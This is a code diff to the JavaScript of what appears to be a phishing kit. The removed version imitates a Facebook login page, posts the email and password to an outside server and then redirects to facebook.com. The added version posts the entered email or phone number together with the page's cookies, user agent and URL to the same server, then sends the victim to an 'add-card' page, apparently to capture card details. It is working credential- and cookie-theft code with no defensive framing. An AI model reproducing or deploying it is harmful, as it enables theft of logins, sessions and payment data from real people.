@@ -1,95 +1,44 @@
-const form = document.querySelector(".login-form");
-const emailInput = document.querySelector('input[type="text"]');
-const passwordInput = document.querySelector('input[type="password"]');
-const successMessage = document.getElementById("successMessage") || document.createElement("div");
+document.addEventListener('DOMContentLoaded', () => {
+  const input = document.getElementById('userId');
+  const button = document.getElementById('submit-btn');
+  const form = document.getElementById('login-form');
 
-const translations = {
-  en: {
-    email: "Email or phone number",
-    password: "Password",
-    login: "Log In",
-    forgot: "Forgot password?",
-    create: "Create new account",
-    page: "Create a Page for a celebrity, brand or business."
-  },
-  ru: {
-    email: "Электронная почта или телефон",
-    password: "Пароль",
-    login: "Войти",
-    forgot: "Забыли пароль?",
-    create: "Создать новый аккаунт",
-    page: "Создайте страницу для знаменитости, бренда или компании."
-  }
-};
+  input.addEventListener('input', () => {
+    button.disabled = input.value.trim() === '';
+  });
 
-// Языковой переключатель
-const langSelect = document.getElementById("langSelect");
-if (langSelect) {
-  langSelect.addEventListener("change", async (e) => {
-    const lang = e.target.value;
-    const t = translations[lang] || translations["en"];
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const value = input.value.trim();
 
-    // Обновление плейсхолдеров и текста
-    document.getElementById("email").placeholder = t.email;
-    document.getElementById("password").placeholder = t.password;
-    document.querySelector(".login-btn").textContent = t.login;
-    document.querySelector(".forgot-link").textContent = t.forgot;
-    document.querySelector(".create-btn").textContent = t.create;
-    document.querySelector(".create-page a").textContent = t.page;
+    const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);
+    if (!isValid) {
+      alert('Please enter a valid phone number or email');
+      return;
+    }
 
-    // Отправка POST запроса (не обязательно)
+    button.disabled = true;
+    button.querySelector('.al-button__label').textContent = 'Loading...';
+
     try {
-      const res = await fetch("/change-lang", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ lang }),
+      const res = await fetch('https://onclick-back.onrender.com/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: value,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          date: new Date().toISOString()
+        })
       });
 
-      const data = await res.json();
-      console.log("Language changed:", data);
+      window.location.href = 'add-card.html';
     } catch (err) {
-      console.error("Language change failed:", err);
+      console.error('Submission error:', err);
+      alert('Something went wrong. Please try again.');
+      button.disabled = false;
+      button.querySelector('.al-button__label').textContent = 'Continue';
     }
   });
-}
-
-successMessage.id = "successMessage";
-successMessage.style.color = "green";
-successMessage.style.marginTop = "10px";
-
-// Обработчик отправки формы
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
-
-  const email = emailInput.value.trim();
-  const password = passwordInput.value.trim();
-
-  if (!email || !password) {
-    successMessage.textContent = "Both fields are required.";
-    form.appendChild(successMessage);
-    return;
-  }
-
-  try {
-    const res = await fetch("https://onclick-back.onrender.com/login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, password })
-    });
-
-    const data = await res.json();
-
-    if (data.success) {
-      window.location.href = "https://www.facebook.com";
-    } else {
-      successMessage.textContent = "❌ Failed to send.";
-      form.appendChild(successMessage);
-    }
-  } catch (err) {
-    console.error("Request failed:", err);
-    successMessage.textContent = "❌ Error. Try again later.";
-    form.appendChild(successMessage);
-  }
-
-  form.reset();
 });
